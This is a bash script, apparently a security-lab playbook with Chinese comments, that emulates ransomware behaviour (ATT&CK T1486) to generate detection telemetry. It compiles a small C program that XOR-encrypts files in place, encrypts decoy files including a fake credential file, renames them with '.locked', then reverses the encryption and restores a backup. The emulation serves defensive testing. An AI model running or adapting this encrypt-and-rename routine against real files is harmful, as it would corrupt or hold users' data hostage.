#!/usr/bin/env bash
# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# T1486：加密器加密蜜罐目录，随后解密恢复（演练不留损）
cat > cryptor.c <<'EOC'
#include <stdio.h>
int main(int argc, char **argv) {
    if (argc < 2) return 1;
    FILE *f = fopen(argv[1], "r+b"); if (!f) return 1;
    int c; long i = 0;
    while ((c = fgetc(f)) != EOF) { fseek(f, -1, SEEK_CUR); fputc(c ^ 0x5A, f); fseek(f, 0, SEEK_CUR); i++; }
    fclose(f); return 0;
}
EOC
cc -O2 -o cryptor.elf cryptor.c
mkdir -p decoy; echo "customer-db-credential" > decoy/db.conf; echo "invoice-2026" > decoy/invoice.txt
cp -a decoy decoy.bak
for f in decoy/*; do ./cryptor.elf "$f" && mv "$f" "$f.locked"; done
for f in decoy/*; do ./cryptor.elf "$f"; done  # XOR 对称，演练后恢复
mv decoy decoy.encrypted; mv decoy.bak decoy
